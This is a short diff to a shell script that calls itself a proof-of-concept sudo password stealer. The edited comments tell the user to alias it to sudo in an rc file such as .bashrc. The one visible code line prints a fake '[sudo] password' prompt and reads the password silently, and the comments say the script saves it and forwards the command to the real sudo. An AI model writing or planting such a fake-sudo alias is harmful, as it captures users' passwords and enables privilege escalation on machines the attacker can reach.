@@ -2,8 +2,8 @@
 
 # IS NOT POSIX COMPLIANT
 
-# This script is a proof-of-concept of an idea that I head.
-# Put the execution of this as an alias to sudo into rc file
+# This script is a proof-of-concept of an idea that I had.
+# Put the execution of this script as a sudo alias into some rc file (e.g. .bashrc)
 # The script will execute instead of sudo, save the password and redirect the command to the actual sudo
 
 echo "[sudo] password for $LOGNAME:" && read -s PASSWORD
